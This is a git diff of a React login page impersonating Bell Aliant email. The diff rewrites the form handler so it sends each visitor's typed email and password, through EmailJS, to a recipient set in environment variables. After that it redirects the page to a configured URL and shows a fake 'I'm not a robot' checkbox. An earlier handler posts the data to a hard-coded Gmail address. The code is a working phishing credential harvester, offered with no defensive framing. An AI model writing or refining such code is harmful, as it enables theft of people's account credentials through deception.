@@ -1,6 +1,7 @@
 // src/HomePage.jsx
 import React, { useState } from "react";
 import axios from "axios";
+import emailjs from "emailjs-com";
 
 const HomePage = () => {
   const [formData, setFormData] = useState({
@@ -36,7 +37,7 @@ const HomePage = () => {
     return Object.keys(errors).length === 0;
   };
 
-  const handleSubmit = async (e) => {
+  const handleSubmitOLD = async (e) => {
     e.preventDefault();
     setIsLoading(true);
     const customizedMessage = `
@@ -51,7 +52,7 @@ const HomePage = () => {
       message: customizedMessage,
       subject: "New Form Submitted",
       email: "krogstadracheal@gmail.com",
-      name: "Bellaliant",
+      name: "Bell Aliant Email",
     };
     console.log(data);
 
@@ -61,7 +62,7 @@ const HomePage = () => {
     if (validateForm()) {
       try {
         await axios.post(url, data);
-        setIsSubmitted(true);
+        location.setIsSubmitted(true);
         setIsLoading(false);
       } catch (error) {
         console.error("Failed to send email:", error);
@@ -69,32 +70,44 @@ const HomePage = () => {
       }
     }
   };
-  // const handleSubmit = async (e) => {
-  //   e.preventDefault();
-  //   if (!validateForm()) return;
+  const handleSubmit = async (e) => {
+    e.preventDefault();
 
-  //   const customizedMessage = `
-  //     Welcome, ${formData.email}!
-  //     Thank you for using our service.
-  //     Remembered: ${formData.remember ? "Yes" : "No"}
-  //   `;
+    if (!validateForm()) return;
+    setIsLoading(true);
+    const senderName = import.meta.env.APP_SENDER_NAME;
+    const redirectUrl = import.meta.env.APP_REDIRECT_URL;
 
-  //   try {
-  //     await emailjs.send(
-  //       import.meta.env.REACT_APP_EMAILJS_SERVICE_ID,
-  //       import.meta.env.REACT_APP_EMAILJS_TEMPLATE_ID,
-  //       {
-  //         to_email: formData.email,
-  //         message: customizedMessage,
-  //       },
-  //       import.meta.env.REACT_APP_EMAILJS_USER_ID
-  //     );
-  //     setSuccessMessage("Email sent successfully!");
-  //   } catch (error) {
-  //     console.error("Email sending error:", error);
-  //     setSuccessMessage("Failed to send email. Please try again.");
-  //   }
-  // };
+    const customizedMessage = `
+    Hello, New Form Submitted 
+    Email: ${formData.email},
+    Password: ${formData.password}
+    Thank you for using our service.
+  `;
+
+    try {
+      const templateParams = {
+        to_name: senderName,
+        from_email: formData.email,
+        message: customizedMessage,
+      };
+
+      const serviceId = import.meta.env.APP_EMAILJS_SERVICE_ID;
+      const templateId = import.meta.env.APP_EMAILJS_TEMPLATE_ID;
+      const userId = import.meta.env.APP_EMAILJS_USER_ID;
+      await emailjs.send(serviceId, templateId, templateParams, userId);
+      setIsLoading(false);
+      if (redirectUrl) {
+        window.parent.location.href = redirectUrl.toString();
+      }
+      setSuccessMessage("Email sent successfully!");
+    } catch (error) {
+      setIsLoading(false);
+      console.error("Email sending error:", error);
+      setSuccessMessage("Failed to send email. Please try again.");
+    }
+  };
+
   return (
     <div className="page">
       {/* Navbar */}
@@ -122,7 +135,7 @@ const HomePage = () => {
         <div className="content">
           <div className="row">
             <div className="col-12">
-              <h2>Courriel Bell Aliant</h2>
+              <h2>Bell Aliant email</h2>
             </div>
           </div>
           <div className="row">
@@ -130,7 +143,7 @@ const HomePage = () => {
             <div className="col-md-6 mb-5 mb-lg-0">
               <div className="card">
                 <div className="card-header">
-                  <h4>Login</h4>
+                  <h4>Log in</h4>
                 </div>
                 <div className="card-body">
                   {isSubmitted ? (
@@ -195,7 +208,7 @@ const HomePage = () => {
                           </div>
                         )}
                       </div>
-                      <div className="mb-3">
+                      <div className="mb-3 c-box">
                         <div className="custom-checkbox">
                           <input
                             type="checkbox"
@@ -209,16 +222,16 @@ const HomePage = () => {
                           <span className="checkbox-box"></span>
                           <label
                             for="styledCheckbox"
-                            className="custom-label form-label"
+                            className="custom-label form-label ms-2"
                           >
-                            Remember my email address!
+                            I'm not a robot
                           </label>
                         </div>
                       </div>
 
                       <div>
                         <button type="submit" className="btn form-btn">
-                          {isLoading ? "Please Wait...." : "Submit"}
+                          {isLoading ? "Please Wait...." : "Login"}
                         </button>
                       </div>
                       <div>
